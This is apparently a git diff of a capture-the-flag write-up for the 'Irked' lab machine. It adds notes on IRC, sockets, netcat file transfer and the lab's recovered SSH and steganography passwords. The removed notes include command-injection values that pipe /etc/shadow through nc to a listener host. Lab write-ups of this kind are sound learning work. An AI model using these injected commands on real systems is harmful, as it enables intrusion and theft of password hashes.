@@ -105,17 +105,22 @@
      * What does IRC mean?  
         According to *TRENDMICRO*  
 
-        <blockqoute>
+        <blockquote>
 
         *Internet Relay Chat (IRC) is a network of Internet servers that use a specific protocol through which individuals can hold real-time online conversations via PCs and other devices. Many of today’s botnets utilize IRC to communicate with bot-infected machines.*
-        </blockqoute>
+        </blockquote>
 
      * What is rpcbind?  
         The rpcbind utility is a server that converts RPC program numbers
         into universal addresses.  It must be running on the host to be
         able to make RPC calls on a server on that machine.
 
-    * What is a socket (check the stackexchange bookmarked page).
+    * What is a socket?  
+      <blockquote>
+
+      *A socket is just a logical endpoint for communication. They exist on the transport layer. You can send and receive things on a socket, you can bind and listen to a socket. A socket is specific to a protocol, machine, and port, and is addressed as such in the header of a packet.*
+      </blockquote>  
+
 
 * ###  <span class="irkedmach subtitle">Web Server  
     * Only found the following page  
@@ -199,31 +204,33 @@
         So here the nc will get executed and of course having my machine listening on port 5555 I get remote code execution.
 
 
+* ###  <span class="irkedmach subtitle">SSH Login  
+  * djmardov's password   
+    Found a file called `.backup`, obviously hidden, and it had a password (password: UPupDOWNdownLRlrBAbaSSss) that I could use to `stegsnow` the image I found in `/var/www/html` where we find a hidden password in the image (password: Kab6h+m+bbp2J:HG). Mostly, steganography is done on images.   
+
+  * How to connect through SSH    
+    ```console
+    ssh [USERNAME]@[TARGET IP ADDRESS]
+    ```
+  * To connect to SSH we will need authenticated credentials.
+
+* ###  <span class="irkedmach subtitle">NetCat  
+  * Transferring files using nc  
+    * On the listening side (reciever)  
+      ```console
+      nc -lp [PORT TO RECIEVE FILE ON] > [FILE]
+      ```
+    * On the sender's side  
+      ```console
+      nc -w 3 [LISTENING IP ADDRESS] [LISTENING PORT] < [FILE]
+      ```
+
 ### <span class="irkedmach subtitle">Why I Got Stuck?  
 
-
-
+Because I kept searching for something that could help me with an SSH password because I already had the username from the email that was written in the irc version in one of the services.  
+I memorized the damn filesystem looking for the right file until I found it.
 
 <br/><br/>
 
 ### <span class="irkedmach subtitle">Nice Things I Found in Someone Else's Write Up  
   
-
-<br/><br/>
-____________________________
-unfinished notes  
-
-AB;nc -l -p 1234 > irked.jpg
-nc -w 3 10.10.14.8 1234 < irked.jpg
-
-AB;cat /etc/shadow | nc 10.10.14.8 1234
-nc -w 3 10.10.14.8 1234 < unreal32docs.html
-
-$ sudo chmod +x /bin/stegcracker what is the +x???
-
-A password!!! UPupDOWNdownLRlrBAbaSSss
-
-UPDOWNLRBASS
-updownlrbass
-
-Kab6h+m+bbp2J:HG
